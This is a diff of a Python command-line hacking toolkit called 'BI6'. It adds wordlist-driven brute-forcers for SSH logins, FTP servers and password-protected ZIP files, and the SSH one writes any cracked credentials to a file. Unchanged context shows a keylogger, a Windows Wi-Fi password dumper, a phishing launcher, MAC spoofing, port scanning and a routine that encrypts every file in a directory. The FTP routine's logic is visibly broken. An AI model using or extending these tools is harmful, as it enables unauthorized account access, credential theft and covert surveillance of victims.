@@ -1,19 +1,171 @@
-#!/Library/Frameworks/Python.framework/Versions/3.10/bin/python3
+#!/usr/bin/python
+
+#if the above code doesn't work go to your terminal and run: which python then, replace `/usr/bin/python` with the python path
+
+
+
 import os
+import zipfile
+import tqdm
+import time
+import socket
 import nmap
 from faker import Faker
 from faker.providers import internet
 from cryptography.fernet import Fernet
 import subprocess
 import ipinfo
+#196.216.144.9
 import sys
+import codecs
 import subprocess
 import string
 import random
 import re
+import ftplib
+from threading import Thread
+import queue
+from colorama import Fore, init
 from pynput import keyboard
+import paramiko
+
 def bi6():
+    
+
     print('Welcome to BI6')
+    
+    def crackSSH():
+        init()
+        GREEN = Fore.GREEN
+        RED   = Fore.RED
+        RESET = Fore.RESET
+        BLUE  = Fore.BLUE
+        wordlist = input('Path to wordlist : ')
+        hostname = input('Host : ')
+        username = input('username : ')
+        usrport = int(input('Port : '))
+        passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore').read().split("\n")
+        def is_ssh_open():
+            
+            
+            
+            
+        # initialize SSH client
+            client = paramiko.SSHClient()
+            # add to know hosts
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                client.connect(hostname=hostname, port=usrport , username=username, password=password, timeout=3)
+            except socket.timeout:
+                # this is when host is unreachable
+                print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
+                return False
+            except paramiko.AuthenticationException:
+                print(f"[!] Invalid credentials for {username}:{password}")
+                return False
+            except paramiko.SSHException:
+                print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
+                # sleep for a minute
+                time.sleep(60)
+                return is_ssh_open()
+            else:
+                # connection was established successfully
+                print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
+                return True
+        for password in passwords:
+            if is_ssh_open():
+            # if combo is valid, save it to a file
+                open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
+                break
+    def crackFtp():
+        global q
+        q = queue.Queue()
+        # number of threads to spawn
+        n_threads = 30
+        # hostname or IP address of the FTP server
+        host = input('FTP Server Address : ')
+        # username of the FTP server, root as default for linux
+        user = input('username : ')
+        # port of FTP, aka 21
+        port = int(input('Port : '))
+
+        def connect_ftp():
+            wordlist = input('Path to wordlist : ')
+        
+            while True:
+                # get the password from the queue
+                password = q.get()
+                # initialize the FTP server object
+                server = ftplib.FTP()
+                print("[!] Trying", password)
+                try:
+                    # tries to connect to FTP server with a timeout of 5
+                    server.connect(host, port, timeout=5)
+                    # login using the credentials (user & password)
+                    server.login(user, password)
+                except ftplib.error_perm:
+                    # login failed, wrong credentials
+                    pass
+                else:
+                    # correct credentials
+                    print(f"{Fore.GREEN}[+] Found credentials: ")
+                    print(f"\tHost: {host}")
+                    print(f"\tUser: {user}")
+                    print(f"\tPassword: {password}{Fore.RESET}")
+                    # we found the password, let's clear the queue
+                    with q.mutex:
+                        q.queue.clear()
+                        q.all_tasks_done.notify_all()
+                        q.unfinished_tasks = 0
+                finally:
+                    # notify the queue that the task is completed for this password
+                    q.task_done()
+
+                # read the wordlist of passwords
+                passwords = open(wordlist).read().split("\n")
+                print("[+] Passwords to try:", len(passwords))
+                # put all passwords to the queue
+                for password in passwords:
+                    q.put(password)
+                # create `n_threads` that runs that function
+                for t in range(n_threads):
+                    thread = Thread(target=connect_ftp)
+                    # will end when the main thread end
+                    thread.daemon = True
+                    thread.start()
+                # wait for the queue to be empty
+                q.join()
+    
+    def crackZip():
+        wordlist = input('Path to wordlist : ')
+        # the password list path you want to use, must be available in the current directory
+        
+        # the zip file you want to crack its password
+        zip_file = input('Zip Name ')
+        # initialize the Zip File object
+        zip_file = zipfile.ZipFile(zip_file + '.zip')
+        # count the number of words in this wordlist
+        n_words = len(list(open(wordlist, "rb")))
+        passwords = codecs.open(wordlist, 'r', encoding='utf-8', errors='ignore')
+        
+        # print the total number of passwords
+        print("Total passwords to test:", n_words)
+        for password in passwords:
+            try:
+                zip_file.extractall(pwd=password)
+            except:
+                print(f'[!] Wrong password: {password}')
+                pass
+                
+                    
+            else:
+                print(f"[+] Password found: {password}")
+                exit(0)
+            
+        
+            
+    
+    
     def lockFiles():
         files = []
         prompt = ""
@@ -37,7 +189,6 @@ def bi6():
                 contents_encrypted = Fernet(key).encrypt(contents)
             with open(file, 'wb') as thefile:
                 thefile.write(contents_encrypted)
-        input('Press enter to exit')
                 
     def unlockFiles():
         files = []
@@ -58,7 +209,6 @@ def bi6():
                 contents_decrypted = Fernet(secretKey).decrypt(contents)
             with open(file, 'wb') as thefile:
                 thefile.write(contents_decrypted)
-        input('Press enter to exit')
             
     def get_random_macos_address():
         """Generate and return a MAC address in the format of Linux"""
@@ -73,7 +223,6 @@ def bi6():
                 else:
                     mac += random.choice(uppercased_hexdigits)
             mac += ":"
-        input('Press enter to exit')
         return mac.strip(":")
 
     def scanPorts():
@@ -86,11 +235,9 @@ def bi6():
             res = nmap.PortScanner().scan(target,str(i))
             res = res['scan'][target]['tcp'][i]['state']
             print(f'{target}:{i} Port {res}')
-        input('Press enter to exit')
             
     def pyPhisher():
-        os.system('pyphisher')
-        input('Press enter to exit')
+        os.system('pyphisher ')
         
     def keyLog():
         
@@ -109,13 +256,11 @@ def bi6():
         
         with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
             listener.join()
-        input('Press enter to exit')
             
         
     def ping():
         target = input('Target: ')
         os.system(f'ping {target} ')
-        input('Press enter to exit')
     def fakeMe():
         locale = input('locale: ')
         fake = Faker(locale)
@@ -125,7 +270,6 @@ def bi6():
         print(f'name:' + fake.name())
         print(fake.ipv4_private())
         print(fake.address())
-        input('Press enter to exit')
         
     def windowsWifi():
         data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
@@ -139,7 +283,6 @@ def bi6():
                     wifitxt.write(results)
             except :
                 print ("{:<30}|  {:<}".format(i, ""))
-            input('Press enter to exit')
     def getIpInfo():
         try:
             ip_address = sys.argv[1]
@@ -154,18 +297,15 @@ def bi6():
         # print the ip info
         for key, value in details.all.items():
             print(f"{key}: {value}")
-        input('Press enter to exit')
             
     def get_current_macos_address(iface):
         # use the ifconfig command to get the interface details, including the MAC address
         output = subprocess.check_output(f"ifconfig {iface}", shell=True).decode()
         return re.search("ether (.+) ", output).group().split()[1].strip()
-        input('Press enter to exit')
     def macos_spoofMac():
         mac = input('Preferred Mac Address: ')
         card = input('Network Card: ')
         os.system(f'brew install spoof-mac && sudo spoof-mac set {card} {mac}')
-        input('Press enter to exit')
     
     command = input('what do you want to do? : ')
     
@@ -185,6 +325,8 @@ def bi6():
         keyLog()
     elif command == 'ping':
         ping()
+    elif command == 'crack ssh':
+        crackSSH()
     elif command == 'fake identity':
         fakeMe()
     elif command == 'win wifi':
@@ -193,9 +335,16 @@ def bi6():
         getIpInfo()
     elif command == 'randomize mac':
         get_random_macos_address()
+    elif command == 'crack zip':
+        crackZip()
+    elif command == 'crack ftp':
+        crackFtp()
     elif command == 'help':
         print(''''lock files' : Lock all files in the current directory
     'set mac address' : Set MacOS Mac address
+    'crack zip' : BruteForce Zip file
+    'crack ssh' : BruteForce SSH
+    'crack ftp' : Bruteforce Ftp server
     'unlock files' : Unlock locked files
     'scan ports' : Scan Ports
     'pyPhisher' : Launch PyPhisher
@@ -209,4 +358,4 @@ def bi6():
         print('Command Not found')
         bi6()
         
-bi6()  
+bi6()    
